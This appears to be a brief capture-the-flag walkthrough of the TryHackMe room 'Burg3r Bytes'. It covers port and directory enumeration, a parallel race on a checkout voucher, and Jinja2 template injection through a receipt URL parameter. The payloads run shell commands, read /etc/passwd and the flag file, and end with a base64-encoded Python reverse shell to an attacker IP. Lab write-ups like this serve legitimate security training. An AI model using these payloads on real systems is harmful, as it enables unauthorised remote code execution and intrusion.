<code>
  
**TryHack3M: Burg3r Bytes**

https://tryhackme.com/room/burg3rbytes

**Enumeration**

``` root@ip-10-67-96-166:~# nmap -Pn -p- 10.67.167.186
Starting Nmap 7.80 ( https://nmap.org ) at 2025-12-29 12:10 GMT
Nmap scan report for 10.67.167.186
Host is up (0.00019s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
root@ip-10-67-96-166:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.67.167.186 -x php,txt,html
```
[+] Url:                     http://10.67.167.186
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 7724]
/register             (Status: 200) [Size: 7773]
/basket               (Status: 200) [Size: 6081]
/checkout             (Status: 200) [Size: 3095]
/console              (Status: 200) [Size: 1563]
Progress: 873100 / 873104 (100.00%)
======================================
```


**Exploiting**

run in repeter in paralel run 15x 

in Burpsuit

```POST /checkout HTTP/1.1
Host: 10.67.128.59
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://10.67.128.59/checkout
Content-Type: application/x-www-form-urlencoded
Content-Length: 147
Origin: http://10.67.128.59
Connection: keep-alive
Cookie: session=eyJjc3JmX3Rva2VuIjoiMTc0ZjYyNDc3ZDJmNzVlMTJjMTIxZThlMmM2OTg1OTk3NzdiYzI3MyJ9.aVN05w.Ppwl7uwxT0EOcvv8PV0FiCJWEm0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

csrf_token=IjE3NGY2MjQ3N2QyZjc1ZTEyYzEyMWU4ZTJjNjk4NTk5Nzc3YmMyNzMi.aVN03A.fycCrxgNSYPyzNXV2OvX-Pht7PE&name=&voucher_code=TRYHACK3M&submit=Checkout
```

get this redirestion link with vulnuerable parm with SSTI jinja2
http://10.67.128.59/receipt/82739098304716027352341076?name=

http://10.67.128.59/receipt/82739098304716027352341076?name={{7/7}}
http://10.67.128.59/receipt/82739098304716027352341076?name={{%20cycler.__init__.__globals__.os.popen(%27id%27).read()%20}}

http://10.67.128.59/receipt/82739098304716027352341076?name={{%20cycler.__init__.__globals__.os.popen(%27cat%20/etc/passwd%27).read()%20}}
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin

http://10.67.128.59/receipt/82739098304716027352341076?name={{%20cycler.__init__.__globals__.os.popen(%27cat%20flag.txt%27).read()%20}}
**GET first Flag**
THM{TryH4ck3M-APP-H4CK}

**Reverse Shell**

http://10.67.128.59/receipt/82739098304716027352341076?name={{%20cycler.__init__.__globals__.os.popen(%27echo%20cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuNjcuMTI2LjEzMiIsOTAwMSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZilmb3IgZiBpbigwLDEsMildO3B0eS5zcGF3bigiL2Jpbi9zaCIpJw%20|%20base64%20-d%20|%20bash%27).read()%20}}

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.67.126.132",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'

</code>
